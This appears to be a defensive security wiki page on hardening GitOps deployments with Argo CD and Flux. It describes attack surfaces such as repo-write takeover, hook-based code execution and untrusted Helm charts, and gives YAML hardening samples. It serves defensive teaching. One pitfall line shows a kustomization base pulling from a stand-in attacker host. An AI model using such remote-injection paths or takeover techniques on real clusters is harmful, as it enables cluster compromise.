---
title: GitOps security — Argo CD and Flux
slug: gitops-security-argo-flux
---

> **TL;DR:** GitOps tooling (Argo CD, Flux) makes Git the source of truth for cluster state; controllers continuously reconcile cluster → repo. The attack surface shifts: anyone who can push to the Git repo controls every cluster watching it. Hardening requires repo-side authorization, signed commits + signed images, restricted Application/Kustomization sources, and admission gating.

## What it is
GitOps replaces `kubectl apply` with a control loop: Argo CD or Flux watches a Git repo + Helm/OCI registry, computes a diff vs the live cluster, applies changes automatically. The cluster credentials don't leave the controller; CI/CD pipelines never get cluster access. But Git becomes the new sensitive perimeter.

## Preconditions / where it applies
- Kubernetes clusters managed by Argo CD or Flux v2 (FluxCD)
- Application or Kustomization manifests in Git repos (public or private)
- OCI registries hosting images / charts the controllers reconcile to

## Attack surface and tradecraft

### 1. Git repo write = cluster takeover
Anyone with write access to a watched branch can push a manifest that mounts hostPath, adds privileged pod, creates ClusterRoleBinding to `cluster-admin`, or schedules a malicious cronjob.

**Defender:**
- Branch protection: required PR reviews, signed commits, status checks
- CODEOWNERS for sensitive paths (`/clusters/prod/**`)
- DCO + GPG/SSH signed commits enforced
- Separate "rendered manifest" repos from "source of truth" Helm charts — fewer human writers

### 2. ApplicationSet / Kustomization source confusion
Argo CD `ApplicationSet` and Flux `Kustomization` can pull from arbitrary Git URLs or Helm OCI references. An attacker who edits the Application CRD can repoint the source to attacker-controlled repo.

**Defender (Argo CD):**
```yaml
# argocd-cm ConfigMap
data:
  resource.exclusions: |
    - apiGroups: ["*"]
      kinds: ["Event"]
  application.allowedNamespaces: argocd, gitops-system
  repositories: |
    - url: https://github.com/myorg/manifests.git
      type: git
  # AppProject restricts which repos and destinations an Application can use
```

```yaml
# Project restricts what Applications can reference
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata: {name: prod}
spec:
  sourceRepos: ['https://github.com/myorg/manifests.git']
  destinations: [{server: '*', namespace: 'prod-*'}]
  clusterResourceWhitelist: []   # no cluster-scoped resources
  namespaceResourceBlacklist:
    - {group: '', kind: Secret}  # block Application-managed Secrets
```

**Defender (Flux):**
```yaml
apiVersion: source.toolkit.fluxcd.io/v1
kind: GitRepository
spec:
  url: https://github.com/myorg/manifests
  secretRef: {name: github-token}
  # ref.branch or .tag with verify.mode: GPG enforces signed commits
  verify:
    mode: HEAD
    secretRef: {name: cosign-pub}
```

### 3. Argo CD UI / API as ingress point
Argo CD's web UI defaults to `argocd-server` Service; exposed via Ingress is common. Auth bypass CVEs (CVE-2022-24348, CVE-2024-21652, etc.) regularly published.

**Defender:**
- Keep Argo CD current; subscribe to GHSA advisories
- Disable local users (`accounts.*.enabled: false`); SSO via OIDC + RBAC
- `disable.auth` MUST be false in production
- Network policy: deny non-RBAC-managed access to argocd-server
- Don't expose to public internet; reverse-proxy with mTLS or VPN

### 4. ImageUpdater / Image Reflector race
Argo CD Image Updater and Flux Image Reflector poll registries for new image tags and rewrite manifests. An attacker who pushes `app:latest-prod` to your watched registry path triggers auto-deploy.

**Defender:**
- Restrict image source registries (allowlist)
- Use immutable tags + digests (`@sha256:...`), not floating tags
- Require image signatures (cosign verify)
- Pre-deploy admission policy validates image provenance

### 5. Helm chart from untrusted OCI / HTTPS
Argo / Flux can pull Helm charts from arbitrary Helm repos. Compromised chart = malicious Job, init container, hook with `helm.sh/hook-weight` running pre-install.

**Defender:**
- Mirror upstream charts into your own OCI registry (Artifactory, Harbor, ECR, ACR, GAR)
- Scan charts pre-mirror (Trivy, Checkov)
- See [[helm-chart-security-audit]]

### 6. Hooks and PostSync — code execution
Argo CD `Sync` hooks run pods at PreSync / Sync / PostSync. Flux `Kustomization.postBuild` runs envsubst-style substitution. Both let an attacker who controls the manifest run code in the cluster with the controller's RBAC.

**Defender:**
- Restrict ServiceAccount RBAC on hooks (use Project's `serviceAccount` setting per destination)
- Disable `argocd-cm.kustomize.buildOptions: --enable-helm` if not strictly needed
- Audit `PostSync` hook activity via Kubernetes audit log

### 7. Secret management
Argo CD reads secrets from manifests; encrypted SecretStore providers (Sealed Secrets, External Secrets Operator, SOPS, Vault Secrets Operator) decrypt at apply time.

**Defender pattern:** **External Secrets Operator (ESO)** + cloud Secrets Manager / Vault. Secrets never appear in Git. Argo CD reconciles `ExternalSecret` CRDs that reference cloud-stored values.

```yaml
apiVersion: external-secrets.io/v1
kind: ExternalSecret
spec:
  secretStoreRef: {name: aws-secrets, kind: ClusterSecretStore}
  target: {name: app-credentials}
  data:
    - secretKey: db_password
      remoteRef: {key: prod/app/db, property: password}
```

### 8. Drift detection vs malicious cluster mutation
GitOps tools reconcile cluster → Git but ALSO Git → cluster. An attacker with cluster admin can change the cluster; GitOps re-applies Git state. Useful as "automatic remediation", but the controller's `selfHeal: true` is sometimes disabled for "convenience" — disabling it makes manual cluster changes persist.

**Defender:**
- `selfHeal: true` + `prune: true` for prod Applications
- Alert on `OutOfSync` status persisting > N minutes — indicates either bad config or active tampering
- Hunt for `Application.spec.source` changes in audit log

### 9. Multi-cluster sprawl
A single Argo CD instance can manage 100+ clusters. Compromise of the management cluster = compromise of all targets. Same for Flux's `Bucket` / `OCIRepository` upstreams.

**Defender:**
- Per-environment Argo CD instances (don't manage prod from dev)
- Cluster credentials sealed in management cluster's secret store; rotate quarterly
- For Flux: leaf clusters reconcile their own GitRepository; no central controller compromise

## OPSEC for blue team

- Audit Argo CD Project changes — adding repo to `sourceRepos` is a privilege expansion
- Watch for new `Application` CRDs created outside CI/CD — should ALWAYS be GitOps-managed
- Argo CD Notifications + Slack webhooks: alert on sync failures, image overrides, RBAC errors
- Flux `ResourceSet` changes are admission-eligible for OPA/Kyverno validation; gate them

## CI/CD pipeline interaction

GitOps doesn't eliminate CI/CD — it shifts responsibility:
- **CI**: build, scan, sign images, push to registry, update manifests via PR
- **CD via GitOps**: controller reconciles to new image
- Pipeline never holds cluster creds → smaller blast radius

Image signing chain ([[sigstore-cosign-supply-chain-signing]]) + admission policy ([[policy-as-code-opa-kyverno-defender]]) prevents unsigned images from deploying regardless of GitOps source.

## Common implementation pitfalls

- Same Git repo for app code AND GitOps manifests — developer push to app code branch shouldn't deploy infra
- Branch protection disabled for "emergency hotfix" workflow — attack window
- Argo CD running with cluster-admin permissions in target clusters — restrict via Projects + impersonation
- Allowing `helm.sh/hook` from untrusted charts — attacker code path
- No verification of `kustomization.yaml` resource URLs — `bases: [https://attacker.tld/k.yaml]` injects arbitrary state

## References
- [Argo CD docs — security](https://argo-cd.readthedocs.io/en/stable/operator-manual/security/)
- [Flux docs — security](https://fluxcd.io/flux/security/)
- [OpenSSF GitOps best practices](https://openssf.org/)
- [Datadog Security Labs — Argo CD attack surface](https://securitylabs.datadoghq.com/)
- [KubeCon talks: "Securing GitOps Pipelines"](https://www.youtube.com/c/cloudnativefdn)

See also: [[ci-cd-as-cloud-attack-surface]], [[helm-chart-security-audit]], [[sigstore-cosign-supply-chain-signing]], [[slsa-supply-chain-framework]], [[policy-as-code-opa-kyverno-defender]], [[cicd-pipeline-hardening-defender]], [[k8s-rbac-abuse]], [[k8s-admission-webhook-abuse]], [[gha-oidc-sub-claim-wildcards]], [[tj-actions-tag-mutation]], [[devsecops-platform-engineering]]
